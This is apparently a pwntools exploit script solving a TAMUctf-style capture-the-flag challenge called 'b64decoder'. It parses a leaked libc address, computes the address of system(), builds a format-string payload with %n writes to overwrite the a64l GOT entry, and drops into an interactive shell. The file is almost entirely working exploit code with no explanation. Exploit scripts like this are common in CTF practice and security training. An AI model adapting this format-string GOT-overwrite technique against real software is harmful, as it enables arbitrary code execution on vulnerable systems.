from pwn import *
import re

libc = ELF('libc.so.6')
elf = ELF('b64decoder')
addr_rva_a64l = libc.symbols['a64l']
addr_rva_system = libc.symbols['system']
addr_plt_a64l = elf.plt['a64l']

#p = remote('challenges.tamuctf.com', 2783)
p = process('b64decoder')


recv = p.recvuntil('name!  ')

print recv


pt = re.compile('[a-f0-9]{7,8}') #get a64l address
res = pt.findall(recv)

addr_got_a64l = int(res[0],16)
addr_base = addr_got_a64l - addr_rva_a64l
addr_got_system = addr_base + addr_rva_system
print 'addr system: ' + hex(addr_got_system)
raw_input()

#overwrite first 2 bytes
fir = ((addr_got_system >> 16) & 0xffff)-1
payload = '%{0}x%$AAn'.format(fir)
payload += '%{0}x%$BBn'.format(((addr_got_system & 0xffff)<<16)-1-len(payload)-fir)
payload += 'a'*(len(payload)%4)
payload += p32(addr_plt_a64l)
payload += p32(addr_plt_a64l+2)
payload = payload.replace('AA', str(70+len(payload)/4-1))
payload = payload.replace('BB', str(70+len(payload)/4))



print 'payload: ' + payload
print 'payload: ' + payload
print 'payload: ' + payload
print payload.encode('hex')
print 'len: ' + str(len(payload))
raw_input()
p.sendline(payload)
print '\n\n\n'

'''
p.recvuntil('decoded: ')
p.sendline('/bin/sh')
'''



p.interactive()
